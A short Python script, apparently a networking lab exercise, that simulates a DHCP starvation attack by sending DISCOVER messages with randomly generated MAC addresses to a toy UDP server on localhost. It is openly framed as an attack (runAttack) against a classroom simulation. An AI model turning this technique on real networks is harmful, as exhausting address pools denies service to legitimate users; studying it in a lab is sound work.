import socket
import uuid
import random
import time

# SERVER IP AND PORT NUMBER [DO NOT CHANGE VAR NAMES]
SERVER_IP = "10.0.0.100"
SERVER_PORT = 9000
mac_addresses = []
client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
num_attacks = 14  # Number of DISCOVER messages to send
def generate_random_mac():
    if not mac_addresses:
        for _ in range(14):
            mac_address = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
            mac_addresses.append(':'.join(["%02x" % x for x in mac_address]))
    mac = mac_addresses.pop()
    return mac



def runAttack(num_attacks):
    for x in range(num_attacks):
        random_mac = generate_random_mac()
        print(f"Sending DISCOVER with random MAC: {random_mac}")
        discover_message = f"DISCOVER {random_mac} "
        client_socket.sendto(discover_message.encode(), ("127.0.0.1", SERVER_PORT))
        response, _ = client_socket.recvfrom(4096)
        print(f"Received: {response.decode()}")


runAttack(num_attacks)
client_socket.close()
